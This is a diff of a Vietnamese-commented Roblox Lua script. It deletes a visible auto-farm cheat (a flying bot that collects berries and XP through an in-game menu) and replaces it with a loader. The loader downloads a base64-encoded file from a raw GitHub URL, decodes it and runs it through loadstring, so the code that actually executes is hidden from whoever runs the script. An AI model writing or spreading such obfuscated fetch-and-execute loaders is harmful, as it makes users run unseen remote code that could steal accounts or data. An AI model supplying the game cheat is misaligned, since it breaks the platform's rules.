@@ -1,329 +1,52 @@
--- Dịch vụ cần thiết
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
+local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 
-local player = Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
-local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+local function decodeBase64(data)
+    data = string.gsub(data, '[^'..b..'=]', '')
+    local dec = {}
+    local lut = {}
+    for i = 1, #b do lut[b:sub(i, i)] = i - 1 end
+    
+    local i = 1
+    while i <= #data do
+        local c1 = lut[data:sub(i, i)] or 0
+        local c2 = lut[data:sub(i+1, i+1)] or 0
+        local c3 = lut[data:sub(i+2, i+2)] or 0
+        local c4 = lut[data:sub(i+3, i+3)] or 0
+        
+        local b1 = bit32.bor(bit32.lshift(c1, 2), bit32.rshift(c2, 4))
+        table.insert(dec, string.char(b1))
+        
+        if data:sub(i+2, i+2) ~= '=' and i+2 <= #data then
+            local b2 = bit32.bor(bit32.lshift(bit32.band(c2, 15), 4), bit32.rshift(c3, 2))
+            table.insert(dec, string.char(b2))
+        end
+        
+        if data:sub(i+3, i+3) ~= '=' and i+3 <= #data then
+            local b3 = bit32.bor(bit32.lshift(bit32.band(c3, 3), 6), c4)
+            table.insert(dec, string.char(b3))
+        end
+        
+        i = i + 4
+    end
+    
+    return table.concat(dec)
+end
 
--- Cấu hình thông số
-local autoFarmActive = false
-local fixedY = 0.9
-local yTolerance = 1.5
-local maxSearchDistance = 250
-local normalSpeed = 10 -- Tốc độ mặc định
+-- Link Raw mới: siuvippro82
+local rawUrl = "https://raw.githubusercontent.com/PainPH10/13-9/refs/heads/main/siuvippro82?v=" .. math.random(1, 100000)
 
-local lastWanderTime = 0
-local wanderTarget = nil
-local currentVelocity = Vector3.new(0, 0, 0)
-
-print("--- Script Morphup (Fix thanh kéo cực mượt + Font Pixel chuẩn) đã khởi tạo ---")
-
--- Tạo Menu Giao Diện (UI)
-local success, err = pcall(function()
-	local screenGui = Instance.new("ScreenGui")
-	screenGui.Name = "MorphupSmoothFlyGui"
-	screenGui.ResetOnSpawn = false
-	screenGui.Parent = player:WaitForChild("PlayerGui")
-
-	local mainFrame = Instance.new("Frame")
-	mainFrame.Size = UDim2.new(0, 240, 0, 160)
-	mainFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
-	mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
-	mainFrame.BorderSizePixel = 0
-	mainFrame.Active = true
-	mainFrame.Draggable = true
-	mainFrame.Parent = screenGui
-
-	local uiCorner = Instance.new("UICorner")
-	uiCorner.CornerRadius = UDim.new(0, 4) -- Vuông vức chuẩn Minecraft
-	uiCorner.Parent = mainFrame
-
-	local uiStroke = Instance.new("UIStroke")
-	uiStroke.Color = Color3.fromRGB(80, 80, 90)
-	uiStroke.Thickness = 2
-	uiStroke.Parent = mainFrame
-
-	-- Tiêu đề (Dùng font Code tạo nét blocky pixel)
-	local titleLabel = Instance.new("TextLabel")
-	titleLabel.Size = UDim2.new(0.7, 0, 0, 25)
-	titleLabel.Position = UDim2.new(0.05, 0, 0, 5)
-	titleLabel.BackgroundTransparency = 1
-	titleLabel.Text = "AUTO FARM GUI"
-	titleLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
-	titleLabel.TextSize = 13
-	titleLabel.Font = Enum.Font.Code 
-	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
-	titleLabel.Parent = mainFrame
-
-	-- Nút Thu Gọn / Mở Rộng Menu (-)
-	local minimizeButton = Instance.new("TextButton")
-	minimizeButton.Size = UDim2.new(0, 25, 0, 25)
-	minimizeButton.Position = UDim2.new(0.83, 0, 0, 5)
-	minimizeButton.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
-	minimizeButton.Text = "-"
-	minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-	minimizeButton.TextSize = 16
-	minimizeButton.Font = Enum.Font.Code
-	minimizeButton.Parent = mainFrame
-
-	local minCorner = Instance.new("UICorner")
-	minCorner.CornerRadius = UDim.new(0, 3)
-	minCorner.Parent = minimizeButton
-
-	-- Nút bấm chính (Auto Bay)
-	local toggleButton = Instance.new("TextButton")
-	toggleButton.Size = UDim2.new(0.88, 0, 0, 42)
-	toggleButton.Position = UDim2.new(0.06, 0, 0.32, 0)
-	toggleButton.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
-	toggleButton.Text = "AUTO BAY: TẮT"
-	toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-	toggleButton.TextSize = 14
-	toggleButton.Font = Enum.Font.Code
-	toggleButton.Parent = mainFrame
-
-	local btnCorner = Instance.new("UICorner")
-	btnCorner.CornerRadius = UDim.new(0, 3)
-	btnCorner.Parent = toggleButton
-
-	-- Nhãn hiển thị tốc độ
-	local speedLabel = Instance.new("TextLabel")
-	speedLabel.Size = UDim2.new(0.88, 0, 0, 20)
-	speedLabel.Position = UDim2.new(0.06, 0, 0.63, 0)
-	speedLabel.BackgroundTransparency = 1
-	speedLabel.Text = "Tốc độ bay: 10 / 20"
-	speedLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
-	speedLabel.TextSize = 12
-	speedLabel.Font = Enum.Font.Code
-	speedLabel.TextXAlignment = Enum.TextXAlignment.Left
-	speedLabel.Parent = mainFrame
-
-	-- Thanh trượt Speed (Slider Background) thiết kế chuẩn dễ kéo
-	local sliderBackground = Instance.new("TextButton") -- Dùng TextButton để bắt sự kiện bấm cực nhạy trên mọi thiết bị
-	sliderBackground.Size = UDim2.new(0.88, 0, 0, 12)
-	sliderBackground.Position = UDim2.new(0.06, 0, 0.78, 0)
-	sliderBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
-	sliderBackground.BorderSizePixel = 0
-	sliderBackground.Text = ""
-	sliderBackground.Parent = mainFrame
-
-	local sliderBgCorner = Instance.new("UICorner")
-	sliderBgCorner.CornerRadius = UDim.new(0, 3)
-	sliderBgCorner.Parent = sliderBackground
-
-	local sliderFill = Instance.new("Frame")
-	sliderFill.Size = UDim2.new(10/20, 0, 1, 0) -- 10/20 tương ứng 50%
-	sliderFill.BackgroundColor3 = Color3.fromRGB(60, 160, 255)
-	sliderFill.BorderSizePixel = 0
-	sliderFill.Parent = sliderBackground
-
-	local sliderFillCorner = Instance.new("UICorner")
-	sliderFillCorner.CornerRadius = UDim.new(0, 3)
-	sliderFillCorner.Parent = sliderFill
-
-	-- LOGIC KÉO THANH TRƯỢT SIÊU MƯỢT (FIX HOÀN TOÀN LỖI KHÔNG KÉO ĐƯỢC)
-	local dragging = false
-
-	local function updateSlider(input)
-		local sliderPos = sliderBackground.AbsolutePosition.X
-		local sliderSize = sliderBackground.AbsoluteSize.X
-		local relativeX = math.clamp(input.Position.X - sliderPos, 0, sliderSize)
-		local percentage = relativeX / sliderSize
-		
-		sliderFill.Size = UDim2.new(percentage, 0, 1, 0)
-		
-		-- Tính toán từ 1 đến 20
-		normalSpeed = math.floor(percentage * 19 + 1)
-		if normalSpeed > 20 then normalSpeed = 20 end
-		if normalSpeed < 1 then normalSpeed = 1 end
-		
-		speedLabel.Text = "Tốc độ bay: " .. tostring(normalSpeed) .. " / 20"
-	end
-
-	sliderBackground.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			dragging = true
-			updateSlider(input)
-		end
-	end)
-
-	UserInputService.InputEnded:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			dragging = false
-		end
-	end)
-
-	UserInputService.InputChanged:Connect(function(input)
-		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-			updateSlider(input)
-		end
-	end)
-
-	-- Ẩn/hiện khi thu gọn menu
-	local elementsToHide = {toggleButton, speedLabel, sliderBackground}
-	local menuVisible = true
-	
-	minimizeButton.MouseButton1Click:Connect(function()
-		menuVisible = not menuVisible
-		for _, element in ipairs(elementsToHide) do
-			element.Visible = menuVisible
-		end
-		
-		if menuVisible then
-			mainFrame.Size = UDim2.new(0, 240, 0, 160)
-			minimizeButton.Text = "-"
-		else
-			mainFrame.Size = UDim2.new(0, 240, 0, 35)
-			minimizeButton.Text = "+"
-		end
-	end)
-
-	-- Bật/tắt Auto Bay
-	toggleButton.MouseButton1Click:Connect(function()
-		autoFarmActive = not autoFarmActive
-		
-		character = player.Character
-		if character and character:FindFirstChild("Humanoid") then
-			humanoid = character.Humanoid
-		end
-
-		if autoFarmActive then
-			toggleButton.Text = "AUTO BAY: BẬT"
-			toggleButton.BackgroundColor3 = Color3.fromRGB(40, 180, 80)
-		else
-			toggleButton.Text = "AUTO BAY: TẮT"
-			toggleButton.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
-			
-			if humanoid then
-				humanoid.PlatformStand = false
-			end
-			if humanoidRootPart then
-				humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
-			end
-		end
-	end)
+local success, result = pcall(function()
+    local encodedData = game:HttpGet(rawUrl)
+    local decodedCode = decodeBase64(encodedData)
+    
+    local func, err = loadstring(decodedCode)
+    if func then
+        func()
+    else
+        warn("LỖI CÚ PHÁP LUA GỐC:", err)
+    end
 end)
 
 if not success then
-	warn("Lỗi giao diện: " .. tostring(err))
+    warn("LỖI TẢI FILE:", result)
 end
-
--- Hàm kiểm tra đường đi bằng Raycast
-local function isPathBlocked(targetPos)
-	local origin = humanoidRootPart.Position + Vector3.new(0, 2, 0)
-	local direction = targetPos - origin
-	
-	local raycastParams = RaycastParams.new()
-	raycastParams.FilterType = Enum.RaycastFilterType.Exclude
-	raycastParams.FilterDescendantsInstances = {character}
-	raycastParams.IgnoreWater = true
-	
-	local result = workspace:Raycast(origin, direction, raycastParams)
-	if result then
-		if (result.Position - targetPos).Magnitude > 5 then
-			return true 
-		end
-	end
-	return false
-end
-
--- Hàm tìm kiếm vật phẩm thông minh
-local function findSmartItem()
-	local nearestPart = nil
-	local shortestDistance = math.huge
-	
-	if not humanoidRootPart then return nil end
-	local currentPos = humanoidRootPart.Position
-	
-	for _, obj in ipairs(workspace:GetDescendants()) do
-		local targetPart = nil
-		if obj:IsA("BasePart") then
-			targetPart = obj
-		elseif obj:IsA("Model") then
-			targetPart = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
-		end
-		
-		if targetPart then
-			local partPos = targetPart.Position
-			if math.abs(partPos.Y - fixedY) <= yTolerance or math.abs(partPos.Y - currentPos.Y) <= yTolerance then
-				local nameLower = string.lower(targetPart.Name)
-				local parentNameLower = string.lower(targetPart.Parent.Name)
-				
-				local isItem = string.find(nameLower, "berry") or 
-				                string.find(nameLower, "food") or 
-				                string.find(nameLower, "fruit") or
-				                string.find(parentNameLower, "berry") or
-				                string.find(parentNameLower, "food") or
-				                string.find(nameLower, "xp")
-								
-				local isIgnored = string.find(nameLower, "spawn") or string.find(nameLower, "baseplate")
-				
-				if isItem and not isIgnored then
-					local distance = (currentPos - partPos).Magnitude
-					if distance <= maxSearchDistance and not character:IsAncestorOf(targetPart) then
-						if not isPathBlocked(partPos) then
-							if distance < shortestDistance then
-								shortestDistance = distance
-								nearestPart = targetPart
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-	return nearestPart
-end
-
--- Vòng lặp di chuyển mượt
-RunService.Heartbeat:Connect(function(dt)
-	if not autoFarmActive then return end
-	
-	character = player.Character
-	if not character or not character:FindFirstChild("Humanoid") or not character:FindFirstChild("HumanoidRootPart") then return end
-	
-	humanoid = character.Humanoid
-	humanoidRootPart = character.HumanoidRootPart
-	
-	humanoid.PlatformStand = true 
-	
-	local currentPos = humanoidRootPart.Position
-	local targetItem = findSmartItem()
-	local targetPos = nil
-	
-	if targetItem and targetItem.Parent then
-		targetPos = Vector3.new(targetItem.Position.X, fixedY, targetItem.Position.Z)
-		lastWanderTime = tick()
-	else
-		if tick() - lastWanderTime > 3 then
-			lastWanderTime = tick()
-			local randomX = currentPos.X + math.random(-70, 70)
-			local randomZ = currentPos.Z + math.random(-70, 70)
-			wanderTarget = Vector3.new(randomX, fixedY, randomZ)
-		end
-		if wanderTarget then
-			targetPos = wanderTarget
-		end
-	end
-	
-	if targetPos then
-		local goalPos = Vector3.new(targetPos.X, fixedY, targetPos.Z)
-		local direction = (goalPos - currentPos)
-		local distance = direction.Magnitude
-		
-		if distance > 1 then
-			direction = direction.Unit
-			local targetVel = direction * normalSpeed
-			currentVelocity = currentVelocity:Lerp(targetVel, math.clamp(dt * 10, 0, 1))
-			
-			local newPos = currentPos + currentVelocity * dt
-			humanoidRootPart.CFrame = CFrame.new(newPos.X, fixedY, newPos.Z) * CFrame.Angles(0, math.atan2(-direction.X, -direction.Z), 0)
-			humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
-		else
-			currentVelocity = Vector3.new(0, 0, 0)
-			humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
-		end
-	end
-end)
